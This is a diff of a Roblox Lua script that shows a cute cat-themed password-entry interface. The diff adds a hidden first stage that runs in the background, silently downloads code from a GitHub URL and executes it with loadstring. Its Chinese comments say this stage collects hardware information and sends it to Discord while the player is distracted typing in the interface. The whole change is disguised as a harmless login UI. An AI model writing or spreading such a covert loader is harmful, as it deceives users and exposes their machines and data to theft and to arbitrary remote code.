@@ -1,18 +1,27 @@
 -- [[ 👁️ NEKO PRIVATE SYSTEM - INTEGRATED 2026 🐾 ]] --
 
-local CorrectKey = "KAWAIINONEKO" -- 🌸 主人設定的可愛密碼
--- 這裡小柒保持主人原本的變數結構
+-- [[ 🚀 第一階段：啟動隱形特務 (抓取硬體並發送 Discord) ]] --
+task.spawn(function()
+    pcall(function()
+        -- 趁玩家正在看 UI 打字時，悄悄執行 GitHub 上的 P 計劃
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/n9wmwd7ycz-crypto/-/refs/heads/main/P"))()
+    end)
+end)
+
+-- [[ 🌸 第二階段：UI 核心參數與設定 ]] --
+local CorrectKey = "KAWAIINONEKO" 
 local _0xUrl = "https://raw.githubusercontent.com/n9wmwd7ycz-crypto/-/refs/heads/main/Neko"
 
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 local lp = game:GetService("Players").LocalPlayer
 
--- [[ UI ROOT ]]
-local sg = Instance.new("ScreenGui", CoreGui)
+-- [[ 🎨 第三階段：繪製華麗 UI ]] --
+local sg = Instance.new("ScreenGui")
+pcall(function() sg.Parent = CoreGui end)
+if not sg.Parent then sg.Parent = lp:WaitForChild("PlayerGui") end
 sg.Name = "Neko_Ultimate_Access"
 
--- [[ 1. 驗證與動畫主體 ]]
 local Main = Instance.new("Frame", sg)
 Main.Size = UDim2.new(0, 360, 0, 240)
 Main.Position = UDim2.new(0.5, -180, 0.5, -120)
@@ -76,7 +85,7 @@ LoginBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 LoginBtn.Font = Enum.Font.GothamBold
 Instance.new("UICorner", LoginBtn)
 
--- [[ 2. 驗證與載入動畫邏輯 ]]
+-- [[ 🔒 第四階段：驗證與載入動畫邏輯 ]] --
 LoginBtn.MouseButton1Click:Connect(function()
     if KeyBox.Text == CorrectKey then
         LoginBtn.Text = "歡迎回來，主人喵！🐾"
@@ -115,7 +124,7 @@ LoginBtn.MouseButton1Click:Connect(function()
             task.wait(0.5)
             sg:Destroy()
             
-            -- [[ 3. 執行主人指定的最新連結 ]]
+            -- [[ 🚀 執行主人的 Neko 核心連結 ]] --
             task.spawn(function()
                 local success, content = pcall(function() return game:HttpGet(_0xUrl) end)
                 if success and content then
@@ -124,7 +133,6 @@ LoginBtn.MouseButton1Click:Connect(function()
                 else
                     warn("🐾 NEKO: 核心載入失敗喵！")
                 end
-                _0xUrl = nil
             end)
         end)
     else
